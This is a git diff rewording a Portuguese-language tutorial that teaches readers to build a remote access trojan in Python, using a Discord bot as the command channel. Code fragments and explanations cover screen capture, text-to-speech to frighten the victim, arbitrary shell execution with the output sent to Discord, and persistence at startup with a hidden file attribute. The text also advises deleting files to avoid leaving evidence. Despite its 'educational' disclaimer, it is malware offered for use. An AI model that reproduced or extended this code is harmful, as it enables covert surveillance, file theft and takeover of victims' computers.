@@ -1,40 +1,40 @@
 # RAT - Remote Administration Tool
 
-RAT é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.
+RAT (Remote Administration Tool) é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.
 
-Basicamente, um RAT é um Cavalo de Troia de Acesso Remoto, que permite ao invasor ter controle total sobre o sistema infectado. Ou seja, o invasor pode fazer o que quiser no computador da vítima, sem que ela saiba.
+Basicamente, um RAT é um Cavalo de Troia de Acesso Remoto, que dá ao invasor controle total sobre o sistema infectado. Ou seja, o invasor pode fazer o que quiser no computador da vítima, sem que ela perceba.
 
 ## Principais funcionalidades de um RAT
 
-Alguns dos recursos mais comuns de um RAT incluem:
+Algumas das funcionalidades mais comuns de um RAT incluem:
 
-- **Captura de tela:** O RAT pode capturar imagens da tela do computador da vítima, permitindo ao invasor ver o que está sendo exibido na tela.
+- **Captura de tela:** O RAT pode capturar imagens da tela do computador da vítima, permitindo que o invasor veja o que está sendo exibido.
 
-- **Gravação de áudio:** O RAT pode gravar áudio do microfone do computador da vítima, permitindo ao invasor ouvir conversas e sons no ambiente.
+- **Gravação de áudio:** O RAT pode gravar áudio do microfone do computador da vítima, permitindo que o invasor escute conversas e sons do ambiente.
 
-- **Roubo de arquivos:** O RAT pode roubar arquivos do computador da vítima, permitindo ao invasor acessar documentos, fotos, vídeos e outros arquivos pessoais.
+- **Roubo de arquivos:** O RAT pode roubar arquivos do computador da vítima, dando ao invasor acesso a documentos, fotos, vídeos e outros arquivos pessoais.
 
-- **Execução de comandos:** O RAT pode executar comandos no sistema da vítima, permitindo ao invasor instalar outros malwares, alterar configurações do sistema e realizar outras ações maliciosas.
+- **Execução de comandos:** O RAT pode executar comandos no sistema da vítima, permitindo que o invasor instale outros malwares, altere configurações do sistema e realize outras ações maliciosas.
 
-E hoje vamos criar o nosso próprio RAT simples em Python!
+Hoje, vamos criar nosso próprio RAT simples em Python!
 
-## Como o RAT funciona?
+## Como funciona um RAT?
 
-Normalmente para se criar uma conexão remota entre o invasor e a vítima, é necessário que o invasor tenha um servidor que escute por conexões e que a vítima tenha um cliente que se conecte a esse servidor. Mas nesse caso não temos um servidor para isso, mas podemos simular essa conexão usando o discord.
+Normalmente, para criar uma conexão remota entre o invasor e a vítima, o invasor precisa de um servidor que aguarde conexões, enquanto a vítima precisa de um cliente que se conecte a esse servidor. Porém, neste caso, não temos um servidor, mas podemos simular essa conexão usando o Discord.
 
-Se você parar para pensar, um bot de discord pode rodar localmente no seu computador e executar comandos os ou sys, o que não acontece se você rodar um bot de discord em um servidor. Foi ai que tive a ideia de criar um bot de discord que executa comandos diretamente no computador, ou seja, se outra pessoa rodar esse bot para mim e eu tiver acesso ao chat do discord, eu posso controlar o computador dela remotamente.
+Se você pensar bem, um bot do Discord pode rodar localmente no seu computador e executar comandos do sistema operacional, o que não ocorre se você rodar o bot em um servidor. Foi aí que surgiu a ideia de criar um bot do Discord que executa comandos diretamente no computador. Ou seja, se outra pessoa rodar esse bot para mim e eu tiver acesso ao chat do Discord, posso controlar o computador dela remotamente.
 
-Caso você não tenha uma conta no discord, crie uma em [discord.com](https://discord.com) e crie um servidor para testes.
+Caso você ainda não tenha uma conta no Discord, crie uma em [discord.com](https://discord.com) e crie um servidor para testes.
 
-> **DISCLAIMER:** Esse RAT é apenas para fins educacionais e não deve ser usado para prejudicar outras pessoas. O uso de RATs é ilegal e pode resultar em graves consequências legais. ;)
+> **DISCLAIMER:** Este RAT é apenas para fins educacionais e não deve ser usado para prejudicar outras pessoas. O uso de RATs é ilegal e pode resultar em graves consequências legais
 
 ## Criando o nosso RAT
 
-Bom, primeiramente, essa aula ja tem um repositório no github com o código pronto, então se você deseja ja ver o código do RAT do Maraba, acesse [esse link](https://github.com/gitinspersec/rat)
+Para facilitar, já existe um repositório no GitHub com o código do RAT pronto. Se você deseja conferir o código do "RAT do Maraba", acesse [este link](https://github.com/gitinspersec/rat)
 
-> **Palavras do Maraba:** "Eu me empolguei um pouco nesse RAT, tem mais de 40 comandos que você pode executar remotamente"
+> **Palavras do Maraba:** "Eu me empolguei um pouco neste RAT, ele tem mais de 40 comandos que podem ser executados remotamente."
 
-Antes de tudo, aqui esta o template basico para iniciar um RAT com discord.py
+Abaixo está o template básico para iniciar um RAT com discord.py.
 
 ```py
 
@@ -154,13 +154,11 @@ async def help(ctx):
         await ctx.send(f"```{part}```")
 
 ```
+#
+Este é o template básico para iniciar um RAT (Remote Access Trojan) com a biblioteca `discord.py`. Com ele, você já pode começar a implementar comandos e funcionalidades personalizadas para o seu RAT.
 
-Esse é o template basico para iniciar um RAT com discord.py, com esse template você ja pode começar a adicionar comandos e funcionalidades ao seu RAT.
-
-Vamos adicionar alguns comandos para que você possa ter uma ideia de como funciona o RAT
-
-Vamos adicionar um comando que tem o objetivo de capturar a tela do computador da vítima e enviar para o discord.
-
+Como exemplo, vamos adicionar um comando que captura a tela do computador alvo e envia a imagem diretamente para um canal no Discord. Isso ajudará a ilustrar como configurar e expandir as funcionalidades do RAT.
+#
 ```py
 
 @bot.command(name='screenshot', help=f'Tira um screenshot da tela e envia para o canal atual. Uso: {prefix}screenshot')
@@ -171,15 +169,13 @@ async def screenshot(ctx):
     os.remove('screenshot.png')
 
 ```
-
-Esse comando usa a biblioteca `mss` para capturar a tela do computador da vítima e enviar para o discord. O comando cria um arquivo chamado `screenshot.png` e envia para o discord, logo em seguida o arquivo é removido.
-
-**PS: Nunca esqueça de remover os arquivos que você cria, para não deixar rastros**
-
-Vamos adicionar um comando que tem o objetivo de aumentar o volume para o máximo e um para o mínimo.
-
-Pos sorte eu ja implementei as funções `volumeup` e `volumedown` para você, então você só precisa adicionar os comandos.
-
+#
+Este comando utiliza a biblioteca mss para capturar a tela do computador alvo e enviar a imagem para o Discord. Ele cria um arquivo chamado screenshot.png, que é enviado diretamente ao canal especificado, e em seguida, o arquivo é excluído para evitar rastros no sistema.
+#
+> Importante: Sempre remova os arquivos temporários que você cria, evitando deixar evidências.
+#
+Além disso, vamos adicionar comandos para ajustar o volume do sistema ao máximo e ao mínimo. As funções `volumeup` e `volumedown` já foram implementadas para você, então basta integrá-las aos comandos do bot.
+#
 ```py
 
 @bot.command(name='volumeup', help='Aumenta o volume do computador. Uso: !volumeup')
@@ -193,9 +189,9 @@ async def volume_down(ctx):
     await ctx.send("[*] Volume down to 0%")
 
 ```
-
-Vamos adicionar um commando para "falar" com a vítima, ou seja, o bot vai falar uma mensagem (Imagina o medo que a pessoa vai sentir quando o computador dela começar a falar sozinho)
-
+#
+Vamos adicionar um comando para "falar" com o alvo, ou seja, o bot irá reproduzir uma mensagem de áudio no computador da pessoa. Imagine o impacto quando o dispositivo começar a falar sozinho!
+#
 ```py
 
 @bot.command(name='voice', help=f'Fala a mensagem especificada. Uso: {prefix}voice <mensagem>')
@@ -204,11 +200,11 @@ async def voice(ctx, *, message: str):
     await ctx.send(f"[*] Voice message: {message}")
 
 ```
+#
+Agora vamos para o comando mais crucial: a execução de comandos no sistema do alvo.
 
-Vamos para o comando mais importante, o comando que executa comandos no sistema da vítima.
-
-Para que o virus seja chamado de RAT, ele precisa ter a funcionalidade de executar comandos no sistema da vítima, então vamos adicionar essa funcionalidade ao nosso RAT.
-
+Para que o programa seja considerado um verdadeiro RAT (Remote Access Trojan), ele precisa ter a capacidade de executar comandos no sistema da vítima. Vamos, então, adicionar essa funcionalidade essencial ao nosso RAT.
+#
 ```py
 
 @bot.command(name='shell', help=f'Executa um comando no shell. Uso: {prefix}shell <comando>')
@@ -229,11 +225,11 @@ async def shell(ctx, *, command: str):
         await ctx.send(f"[!] Ocorreu um erro ao executar o comando: {str(e)}")
 
 ```
+#
+Esse comando permite executar um comando no shell e envia a saída diretamente para o Discord. Caso a saída ultrapasse 2000 caracteres, o bot cria um arquivo chamado `output.txt` e o envia no canal para garantir que todo o conteúdo seja entregue.
 
-Esse comando executa um comando no shell e envia a saída para o discord. Se a saída for maior que 2000 caracteres, o bot cria um arquivo chamado `output.txt` e envia para o discord.
-
-Com isso, você ja tem um RAT simples em Python que pode ser usado para controlar remotamente o computador da vítima. Vou apenas fazer mais um comando super importante para que nunca se perca o controle do computador da vítima.
-
+Com isso, você já possui um RAT básico em Python, que pode ser usado para controle remoto do computador alvo. Agora, vamos adicionar um último comando essencial para garantir que você nunca perca o controle sobre o dispositivo.
+#
 ```py
 
 @bot.command(name='startup', help=f'Se coloca para iniciar com o sistema e coloca o atributo de oculto. Uso: {prefix}startup')
@@ -257,13 +253,11 @@ async def startup(ctx):
         await ctx.send(f"[!] Ocorreu um erro ao configurar o bot para iniciar com o sistema: {str(e)}")
 
 ```
+#
+Este comando configura o bot para iniciar automaticamente com o sistema e atribui o modo oculto, ou seja, o bot será executado assim que o sistema ligar, sem que o alvo perceba sua presença.
 
-Esse comando coloca o bot para iniciar com o sistema e coloca o atributo de oculto, ou seja, o bot vai iniciar com o sistema e vai ser oculto, ou seja, a vítima não vai ver que o bot esta rodando.
-
-Bom, a aula em si acaba por aqui, mas vou passar pelo código completo do RAT para que você possa ver como ficou.
-
-Caso tenha algum erro, aqui estao todos os importes que eu usei no RAT
-
+Bom, isso conclui nossa aula. Agora, vou mostrar o código completo do RAT para que você possa ver como ele ficou ao final. Caso apareça algum erro, aqui estão todos os imports necessários para o RAT:
+#
 ```py
 import discord
 from discord.ext import commands
